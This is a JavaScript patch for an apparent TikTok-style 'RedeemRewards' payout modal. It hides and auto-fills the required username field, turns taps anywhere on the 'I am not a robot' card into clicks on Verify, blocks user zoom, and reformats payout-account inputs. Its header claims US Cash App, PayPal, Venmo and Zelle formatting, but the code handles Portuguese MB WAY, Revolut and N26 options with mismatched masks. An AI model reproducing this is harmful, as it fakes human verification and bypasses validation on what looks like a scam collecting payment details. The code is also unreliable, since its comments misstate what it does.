// Runtime patch for the RedeemRewards modal (US localization):
// - Hide the "@yourusername" TikTok field and auto-fill it so validation passes
// - Apply light input formatting for the payout key field based on selected method:
//     Cash App  -> ensure leading "$" (cashtag)
//     PayPal    -> lowercase, trim spaces (email)
//     Venmo     -> ensure leading "@" (handle)
//     Zelle     -> US phone mask (555) 555-5555 when numeric, otherwise pass-through email
(function () {
  if (window.__redeemPatchVersion === 12) return;
  window.__redeemPatchVersion = 12;
  window.__redeemPatchInstalled = true;

  const viewportContent = "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
  let lastUrl = window.location.href;

  function enforceViewport() {
    let viewport = document.querySelector('meta[name="viewport"]');
    if (!viewport) {
      viewport = document.createElement("meta");
      viewport.setAttribute("name", "viewport");
      document.head.appendChild(viewport);
    }
    viewport.setAttribute("content", viewportContent);
    document.documentElement.style.zoom = "1";
    if (document.body) document.body.style.zoom = "1";
  }

  function isTextField(node) {
    return Boolean(node && node.matches && node.matches("input, textarea, select, [contenteditable='true']"));
  }

  function enforceViewportOnly() {
    enforceViewport();
  }

  function refreshViewportAfterScreenChange() {
    requestAnimationFrame(enforceViewportOnly);
    setTimeout(enforceViewportOnly, 60);
    setTimeout(enforceViewportOnly, 180);
    setTimeout(enforceViewportOnly, 420);
    setTimeout(enforceViewportOnly, 900);
  }

  function preventZoom(event) {
    if (event.cancelable) event.preventDefault();
    enforceViewport();
  }

  function preventTouchZoom(event) {
    if (event.touches && event.touches.length > 1) preventZoom(event);
  }

  function findCaptchaVerifyButton(target) {
    const button = document.querySelector('button[aria-label="Verify"]');
    if (!button || !document.body || !document.body.innerText.includes("I am not a robot")) return null;
    if (target && target.closest && target.closest("input, textarea, select, [contenteditable='true']")) return null;
    const card = button.parentElement && button.parentElement.parentElement;
    if (target === button || button.contains(target) || (card && card.contains(target))) return button;
    return null;
  }

  let captchaTapLock = false;
  function activateCaptchaTap(target) {
    const button = findCaptchaVerifyButton(target);
    if (!button) return false;
    if (!captchaTapLock) {
      captchaTapLock = true;
      setTimeout(() => {
        try { button.click(); } catch {}
        setTimeout(() => { captchaTapLock = false; }, 700);
      }, 0);
    }
    return true;
  }

  function preventWheelZoom(event) {
    if (event.ctrlKey || event.metaKey) preventZoom(event);
  }

  function preventKeyboardZoom(event) {
    if ((event.ctrlKey || event.metaKey) && ["+", "-", "=", "0"].includes(event.key)) preventZoom(event);
  }

  if (!window.__mobileGuardPatchedByRedeem) {
    window.__mobileGuardPatchedByRedeem = true;
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;
    history.pushState = function () {
      const result = originalPushState.apply(this, arguments);
      lastUrl = window.location.href;
      refreshViewportAfterScreenChange();
      return result;
    };
    history.replaceState = function () {
      const result = originalReplaceState.apply(this, arguments);
      lastUrl = window.location.href;
      refreshViewportAfterScreenChange();
      return result;
    };
  }

  document.addEventListener("gesturestart", preventZoom, { passive: false, capture: true });
  document.addEventListener("gesturechange", preventZoom, { passive: false, capture: true });
  document.addEventListener("gestureend", preventZoom, { passive: false, capture: true });
  document.addEventListener("touchstart", preventTouchZoom, { passive: false, capture: true });
  document.addEventListener("touchmove", preventTouchZoom, { passive: false, capture: true });
  document.addEventListener("touchend", (event) => { activateCaptchaTap(event.target); enforceViewport(); }, { passive: true, capture: true });
  document.addEventListener("wheel", preventWheelZoom, { passive: false, capture: true });
  document.addEventListener("keydown", preventKeyboardZoom, { passive: false, capture: true });

  window.addEventListener("popstate", refreshViewportAfterScreenChange, { capture: true });
  document.addEventListener("click", (event) => {
    const target = event.target;
    if (activateCaptchaTap(target)) return;
    if (target && target.closest && target.closest("input, textarea, select, [contenteditable='true']")) return;
    if (target && target.closest && target.closest("a, button, [role='button']")) enforceViewport();
  }, true);

  document.addEventListener("focusin", (event) => {
    enforceViewport();
  }, true);
  document.addEventListener("focusout", () => setTimeout(enforceViewport, 180), true);
  if (window.visualViewport) {
    window.visualViewport.addEventListener("resize", () => {
      enforceViewport();
    });
  }

  new MutationObserver(() => {
    if (window.location.href !== lastUrl) {
      lastUrl = window.location.href;
      refreshViewportAfterScreenChange();
    }
  }).observe(document.documentElement, { childList: true, subtree: true });

  enforceViewport();
  refreshViewportAfterScreenChange();
  setInterval(() => {
    enforceViewport();
    if (window.location.href !== lastUrl) {
      lastUrl = window.location.href;
      refreshViewportAfterScreenChange();
    }
  }, 250);

  function setNativeValue(el, value) {
    const proto = Object.getPrototypeOf(el);
    const setter = Object.getOwnPropertyDescriptor(proto, "value")?.set;
    const parentSetter = Object.getOwnPropertyDescriptor(
      HTMLInputElement.prototype,
      "value"
    )?.set;
    if (setter && setter !== parentSetter) {
      parentSetter.call(el, value);
    } else if (setter) {
      setter.call(el, value);
    } else {
      el.value = value;
    }
    el.dispatchEvent(new Event("input", { bubbles: true }));
  }

  function maskPTPhone(v) {
    const d = v.replace(/\D/g, "").slice(0, 9);
    if (d.length === 0) return "";
    if (d.length <= 3) return d;
    if (d.length <= 6) return `${d.slice(0, 3)} ${d.slice(3)}`;
    return `${d.slice(0, 3)} ${d.slice(3, 6)} ${d.slice(6)}`;
  }

  function maskEmail(v) {
    return v.toLowerCase().replace(/\s+/g, "");
  }

  function maskCashtag(v) {
    return maskPTPhone(v);
  }

  function maskVenmo(v) {
    const stripped = v.replace(/\s+/g, "");
    if (!stripped) return "";
    return stripped.startsWith("@") ? stripped : `@${stripped.replace(/^@+/, "")}`;
  }

  function maskZelle(v) {
    return maskEmail(v);
  }

  // The underlying app still emits internal type keys: cpf | email | phone | random
  function selectedKeyTypeFromButtons() {
    const buttons = Array.from(document.querySelectorAll("button"));
    const selected = buttons.find((button) => {
      const text = (button.textContent || "").trim().toLowerCase();
      return (
        ["mb way", "paypal", "revolut", "n26"].includes(text) &&
        /border-pink|text-pink|bg-pink\/5/.test(button.className || "")
      );
    });
    const text = (selected?.textContent || "").trim().toLowerCase();
    if (text === "mb way") return "cashapp";
    if (text === "revolut") return "venmo";
    if (text === "paypal") return "paypal";
    if (text === "n26") return "zelle";
    return null;
  }

  function detectKeyType(input) {
    const ph = (input.getAttribute("placeholder") || "").toLowerCase();
    if (ph.includes("telemóvel") || ph.includes("mb way")) return "cashapp";
    if (ph.includes("paypal") || ph.includes("@paypal") || ph.includes("email do paypal")) return "paypal";
    if (ph.includes("revolut") || ph.includes("revtag")) return "venmo";
    if (ph.includes("n26")) return "zelle";
    const wrapperText = (input.closest("div")?.parentElement?.textContent || "").toLowerCase();
    if (
      wrapperText.includes("payment details") ||
      wrapperText.includes("payout") ||
      wrapperText.includes("detalhes do pagamento") ||
      wrapperText.includes("método de pagamento") ||
      wrapperText.includes("pagamento")
    ) return selectedKeyTypeFromButtons();
    return null;
  }

  function formatByType(value, type) {
    if (type === "cashapp") return maskCashtag(value);
    if (type === "paypal") return maskEmail(value);
    if (type === "venmo") return maskVenmo(value);
    if (type === "zelle") return maskZelle(value);
    return value;
  }

  function isPayoutKeyInput(input) {
    if (!(input instanceof HTMLInputElement)) return false;
    if (input.getAttribute("placeholder") === "@yourusername" || input.getAttribute("placeholder") === "@oseuutilizador") return false;
    return Boolean(detectKeyType(input));
  }

  function applyMask(input, notifyReact) {
    const type = detectKeyType(input);
    if (!type) return;
    const raw = input.value;
    const formatted = formatByType(raw, type);
    if (formatted !== raw) {
      if (notifyReact) setNativeValue(input, formatted);
      else input.value = formatted;
      try {
        input.setSelectionRange(formatted.length, formatted.length);
      } catch {}
    }
  }

  function attachMask(input) {
    if (input.dataset.maskAttached === "1") return;
    input.dataset.maskAttached = "1";
    input.addEventListener("input", function () {
      applyMask(input, true);
    });
    const obs = new MutationObserver(() => {
      applyMask(input, true);
    });
    obs.observe(input, { attributes: true, attributeFilter: ["placeholder"] });
  }

  function hideUsernameField(input) {
    if (input.dataset.hidden === "1") return;
    input.dataset.hidden = "1";
    if (!input.value) setNativeValue(input, "user");
    const wrapper = input.closest("div");
    if (wrapper) wrapper.style.display = "none";
  }

  function applyUsLocalization() {
    document.querySelectorAll("body *").forEach((element) => {
      if (element.children.length) return;
      const text = (element.textContent || "").trim();
      if (text === "+55") element.textContent = "+1";
      if (text === "12345678901") element.textContent = "(202) 555-0123";
    });

    const carrierLogos = [
      { alt: "Claro", name: "Verizon", src: "/assets/verizon-logo.png" },
      { alt: "TIM", name: "AT&T", src: "/assets/att-logo.png" },
      { alt: "Vivo", name: "T-Mobile", src: "/assets/tmobile-logo.png" },
    ];

    carrierLogos.forEach(({ alt, name, src }) => {
      document.querySelectorAll(`img[alt="${alt}"]`).forEach((image) => {
        image.src = src;
        image.alt = name;
      });
    });

    document.querySelectorAll('img[src*="pagbank-logo"]').forEach((image) => {
      image.src = "/assets/ach-logo.png";
      image.alt = "Transferência bancária ACH";
    });

    const instantTransferLogo = document.querySelector('img[alt="Transferência Instantânea"]');
    const payoutLogoRow = instantTransferLogo?.parentElement;
    if (payoutLogoRow && payoutLogoRow.dataset.usPayoutLogos !== "1") {
      payoutLogoRow.dataset.usPayoutLogos = "1";
      payoutLogoRow.replaceChildren();
      const label = document.createElement("span");
      label.className = "text-muted-foreground text-[12px] whitespace-nowrap mr-1";
      label.textContent = "Transferência Bancária (SEPA) /";
      payoutLogoRow.appendChild(label);
      [
        ["data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%23E30613'/%3E%3Ctext x='32' y='39' font-family='Arial,Helvetica,sans-serif' font-size='17' font-weight='700' fill='white' text-anchor='middle'%3EMB%3C/text%3E%3C/svg%3E", "MB WAY"],
        ["/assets/paypal-logo-CXd97tl4.png", "PayPal"],
        ["data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%23000000'/%3E%3Ctext x='32' y='41' font-family='Arial,Helvetica,sans-serif' font-size='26' font-weight='700' fill='white' text-anchor='middle'%3ER%3C/text%3E%3C/svg%3E", "Revolut"],
        ["data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%2348E39A'/%3E%3Ctext x='32' y='38' font-family='Arial,Helvetica,sans-serif' font-size='15' font-weight='700' fill='%23093' text-anchor='middle'%3EN26%3C/text%3E%3C/svg%3E", "N26"],
      ].forEach(([src, alt]) => {
        const image = document.createElement("img");
        image.src = src;
        image.alt = alt;
        image.className = "h-[18px] max-w-[34px] object-contain";
        payoutLogoRow.appendChild(image);
      });
    }
  }

  function scan() {
    document
      .querySelectorAll('input[placeholder="@yourusername"], input[placeholder="@seuusuario"], input[placeholder="@oseuutilizador"]')
      .forEach(hideUsernameField);
    document
      .querySelectorAll('input[type="text"], input:not([type])')
      .forEach((input) => {
        if (isPayoutKeyInput(input)) {
          attachMask(input);
          applyMask(input, true);
        }
      });
    applyUsLocalization();
  }

  document.addEventListener(
    "input",
    function (event) {
      const input = event.target;
      if (isPayoutKeyInput(input)) applyMask(input, false);
    },
    true
  );

  document.addEventListener(
    "paste",
    function (event) {
      const input = event.target;
      if (isPayoutKeyInput(input)) setTimeout(() => applyMask(input, true), 0);
    },
    true
  );

  document.addEventListener(
    "click",
    function () {
      setTimeout(scan, 0);
      setTimeout(scan, 80);
    },
    true
  );

  const mo = new MutationObserver(scan);
  mo.observe(document.documentElement, { childList: true, subtree: true });
  scan();
})();
